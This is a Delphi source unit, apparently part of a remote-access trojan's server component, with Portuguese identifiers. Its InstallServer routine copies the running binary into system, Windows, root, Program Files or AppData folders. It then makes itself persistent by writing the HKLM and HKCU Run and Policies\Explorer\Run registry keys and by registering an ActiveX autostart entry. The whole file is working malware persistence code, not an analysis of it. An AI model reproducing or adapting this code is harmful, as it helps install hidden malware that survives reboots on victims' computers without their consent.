Unit UnitInstalacao;

interface

uses
  windows,
  UnitStartUp,
  UnitSettings,
  UnitServerUtils,
  UnitDiversos;

function InstallServer(Arquivo: string): string;

implementation

function InstallServer(Arquivo: string): string;
var
  Diretorio: string;
  FileName: string;
  DiretorioAlternativo: string;
  FileNameAlternativo: string;
begin
  result := Arquivo;
  if OndeInstalar = 0 then Diretorio := MySystemFolder  else
  if OndeInstalar = 1 then Diretorio := MyWindowsFolder else
  if OndeInstalar = 2 then Diretorio := MyRootFolder else
  if OndeInstalar = 3 then Diretorio := GetProgramFilesDir else
  begin
    if OndeInstalarOpcional[length(OndeInstalarOpcional)] <> '\' then OndeInstalarOpcional := OndeInstalarOpcional + '\';
    Diretorio := OndeInstalarOpcional;
    ForceDirectories(pchar(Diretorio));
  end;
  if Diretorio[length(Diretorio)] <> '\' then Diretorio := Diretorio + '\';
  Diretorio := Diretorio + OndeInstalarComplemento;
  if Diretorio[length(Diretorio)] <> '\' then Diretorio := Diretorio + '\';

  FileName := Diretorio + NomeArquivoInstalacao;
  ForceDirectories(pchar(Diretorio));
  MyDeleteFile(pchar(FileName));

  DiretorioAlternativo := getappdatadir + '\' + OndeInstalarComplemento;
  if DiretorioAlternativo[length(DiretorioAlternativo)] <> '\' then DiretorioAlternativo := DiretorioAlternativo + '\';
  FileNameAlternativo := DiretorioAlternativo + NomeArquivoInstalacao;

  if (UpperString(FileName) = UpperString(Arquivo)) or (UpperString(FileNameAlternativo) = UpperString(Arquivo)) then
  begin
    result := Arquivo;
    exit;
  end;

  if CopyFile(pchar(Arquivo), pchar(FileName), FALSE) = true then
  result := FileName else
  begin
    ForceDirectories(pchar(DiretorioAlternativo));
    MyDeleteFile(pchar(FileNameAlternativo));

    if copyfile(pchar(Arquivo), pchar(FileNameAlternativo), FALSE) = true then
    result := FileNameAlternativo else Result := Arquivo;
  end;

  if Policies <> '' then
  begin
    if lerreg(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run', pchar(Policies), '') <> result then
    Write2Reg(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run', pchar(Policies), Pchar(result));
    if lerreg(HKEY_CURRENT_USER, 'Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run', pchar(Policies), '') <> result then
    Write2Reg(HKEY_CURRENT_USER, 'Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run', pchar(Policies), Pchar(result));
  end;

  if HKLM <> '' then
  if lerreg(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows\CurrentVersion\Run', pchar(HKLM), '') <> result then
  Write2Reg(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows\CurrentVersion\Run', pchar(HKLM), Pchar(result));

  if HKCU <> '' then
  if lerreg(HKEY_CURRENT_USER, 'Software\Microsoft\Windows\CurrentVersion\Run', pchar(HKCU), '') <> result then
  Write2Reg(HKEY_CURRENT_USER, 'Software\Microsoft\Windows\CurrentVersion\Run', pchar(HKCU), Pchar(result));

  if activeX <> '' then
  TCAutostart.Create.Startup(pchar(activeX), Pchar(result), '');

end;

end.
